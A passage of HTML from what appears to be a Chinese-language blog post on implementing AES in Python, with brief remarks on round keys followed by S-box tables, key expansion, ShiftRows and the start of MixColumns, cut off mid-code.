class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>没有用上加密挺可惜的2333。实际上的轮密钥可以说有11轮。</p></li><li><p>明文的那个方块竟然是从上往下来排序的，为什么不从左往右！</p><p><img src="https://upyun.wuuconix.link/image-20211008214709356.png" alt="从上往下" /></p></li></ol><h2 id="python代码"><a class="markdownIt-Anchor" href="#python代码"></a> python代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">poly1, poly2</span>):   <span class="hljs-comment"># 两个多项式相乘</span><br>result = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(poly2.bit_length()):<br><span class="hljs-keyword">if</span> poly2 &amp; (<span class="hljs-number">1</span> &lt;&lt; index):<br>result ^= (poly1 &lt;&lt; index)<br><span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod</span>(<span class="hljs-params">poly, mod = <span class="hljs-number">0b100011011</span></span>):    <span class="hljs-comment"># 多项式poly模多项式100011011</span><br><span class="hljs-keyword">while</span> poly.bit_length() &gt; <span class="hljs-number">8</span>:  <br>poly ^= (mod &lt;&lt; (poly.bit_length() - <span class="hljs-number">9</span>))<br><span class="hljs-keyword">return</span> poly<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">substitute</span>(<span class="hljs-params">m_hex, inverse=<span class="hljs-literal">False</span></span>):<br>    m_s = []<br>    box = s_box <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inverse <span class="hljs-keyword">else</span> i_s_box<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m_hex:<br>        x, y = <span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>) // <span class="hljs-number">16</span>, <span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>) % <span class="hljs-number">16</span><br>        temp = <span class="hljs-built_in">hex</span>(box[x*<span class="hljs-number">16</span>+y])<br>        m_s.append(temp)<br>    <span class="hljs-keyword">return</span> m_s<br><br>s_box =   [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>]<br>i_s_box = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7D</span>]<br>rcon = [<span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x36</span>]<br>mix_column_matrix   = [<span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x2</span>] <span class="hljs-comment"># 列混合乘的矩阵</span><br>i_mix_column_matrix = [<span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>] <span class="hljs-comment"># 列混合乘的逆矩阵</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>(<span class="hljs-params">key</span>):<br>    key_hex = get_hex(key)<br>    key_rotate = [] <br>    w = [[] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">44</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):<br>        w[i // <span class="hljs-number">4</span>].append(key_hex[i])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">44</span>):<br>        gw = copy.deepcopy(w[i - <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>:<br>            gw[<span class="hljs-number">0</span>], gw[<span class="hljs-number">1</span>], gw[<span class="hljs-number">2</span>], gw[<span class="hljs-number">3</span>] = gw[<span class="hljs-number">1</span>], gw[<span class="hljs-number">2</span>], gw[<span class="hljs-number">3</span>], gw[<span class="hljs-number">0</span>]<br>            gw = substitute(gw) <span class="hljs-comment">#g(w(i-1))</span><br>            gw[<span class="hljs-number">0</span>] = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(gw[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>) ^ rcon[i // <span class="hljs-number">4</span> - <span class="hljs-number">1</span>]) <span class="hljs-comment">#ppt上说的2^(i-4)/4有误，看书p84</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>):<br>            w[i].append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(gw[j], <span class="hljs-number">16</span>) ^ <span class="hljs-built_in">int</span>(w[i-<span class="hljs-number">4</span>][j], <span class="hljs-number">16</span>)))<br>    key_rotate = [w[i * <span class="hljs-number">4</span>] + w[i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>] + w[i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>] + w[ i* <span class="hljs-number">4</span> + <span class="hljs-number">3</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">11</span>)] <span class="hljs-comment"># 轮密钥列表,每个元素都是有16个字节的列表</span><br>    <span class="hljs-keyword">return</span> key_rotate<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">a, key</span>): <span class="hljs-comment">#a和key都是列表，都存了16字节</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(a[i], <span class="hljs-number">16</span>) ^ <span class="hljs-built_in">int</span>(key[i], <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_hex</span>(<span class="hljs-params">s</span>): <span class="hljs-comment">#得到一个字符串的十六进制值，以列表形式返回</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shiftrows</span>(<span class="hljs-params">a, inverse=<span class="hljs-literal">False</span></span>): <span class="hljs-comment">#inverse为True时表示为逆操作，默认为False</span><br>    <span class="hljs-keyword">return</span> [ a[<span class="hljs-number">0</span>], a[<span class="hljs-number">5</span>], a[<span class="hljs-number">10</span>], a[<span class="hljs-number">15</span>], a[<span class="hljs-number">4</span>], a[<span class="hljs-number">9</span>], a[<span class="hljs-number">14</span>], a[<span class="hljs-number">3</span>], a[<span class="hljs-number">8</span>], a[<span class="hljs-number">13</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">7</span>], a[<span class="hljs-number">12</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">6</span>], a[<span class="hljs-number">11</span>] ] <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inverse <span class="hljs-keyword">else</span> [ a[<span class="hljs-number">0</span>], a[<span class="hljs-number">13</span>], a[<span class="hljs-number">10</span>], a[<span class="hljs-number">7</span>], a[<span class="hljs-number">4</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">14</span>], a[<span class="hljs-number">11</span>], a[<span class="hljs-number">8</span>], a[<span class="hljs-number">5</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">15</span>], a[<span class="hljs-number">12</span>], a[<span class="hljs-number">9</span>], a[<span class="hljs-number">6</span>], a[<span class="hljs-number">3</span>] ]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mixcolumn</span>(<span class="hljs-params">m_row, inverse=<span class="hljs-literal">False</span></span>):<br>    matrix = mix_column_matrix <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inverse <span class="hljs-keyword">else</span> i_mix_column_matrix<br>    m_col = []<br>    <span class="hljs-keyword">for</span> i <span 